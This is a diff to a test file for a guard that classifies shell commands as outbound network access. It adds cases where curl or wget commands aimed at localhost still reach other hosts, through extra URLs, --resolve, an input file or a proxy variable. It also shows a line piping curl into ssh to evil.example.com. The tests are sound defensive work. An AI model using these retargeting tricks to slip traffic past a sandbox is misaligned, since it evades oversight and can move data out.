@@ -394,6 +394,16 @@ describe("loopback fetches are not outbound network", () => {
 		// (A pipe into a recognized read-only consumer like `jq` was never
 		// loopback-rule territory; the read-fetch tables clear it.)
 		"curl http://localhost:8000 | ssh evil.example.com cat",
+		// Anything that can retarget or add targets beyond the literal text
+		// fails the single-loopback-operand shape (codex round 2 probes).
+		// Mixed-target READ curls without a write flag clear via the
+		// pre-existing read tables, so each probe carries `-w` (excluded
+		// from the read tables) to reach the loopback rule.
+		'curl -o /dev/null -w \'%{http_code}\' http://localhost:8000 "$REMOTE_URL"',
+		"curl -o /dev/null -w '%{http_code}' --resolve localhost:8000:203.0.113.10 http://localhost:8000",
+		"curl -o /dev/null -w '%{http_code}' http://localhost:8000 ftp://203.0.113.10",
+		"wget http://localhost:8000 --input-file=/tmp/urls.txt",
+		"HTTP_PROXY=http://203.0.113.10:8080 curl http://localhost:8000/x",
 	]) {
 		test(`still outbound: ${command}`, () => {
 			expect(outbound(command)).toBe(true);
